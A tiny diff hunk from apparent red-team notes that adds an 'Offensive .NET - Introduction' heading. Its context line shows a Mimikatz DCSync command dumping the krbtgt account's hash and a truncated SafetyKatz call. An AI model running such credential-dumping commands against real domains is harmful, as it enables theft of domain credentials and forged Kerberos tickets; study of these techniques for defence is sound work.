@@ -519,3 +519,7 @@ $ Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' SafetyKatz.exe "l
 
 
 
+# **Offensive .NET - Introduction**
+
+
+
